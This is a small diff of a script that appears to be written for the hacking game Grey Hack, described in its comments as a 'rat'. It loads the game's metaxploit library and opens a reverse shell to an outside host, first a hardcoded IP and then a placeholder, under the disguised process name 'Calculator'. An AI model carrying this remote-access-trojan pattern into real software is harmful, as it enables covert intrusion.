@@ -1,10 +1,16 @@
 //this program is made by TaxEvader
 //this program is a rat
+
 metax = include_lib("/lib/metaxploit.so")
+
 // checks for metaxploit.so in the lib folder
+
 if metax then
-	metax.rshell_client "198.164.115.102", 1222, "Calculator"
+
+	metax.rshell_client "{your ip of choice}", 1222, "Calculator"
+
 	// if it finds metaxploit it will start an rshell_client
+
 end if
 
 
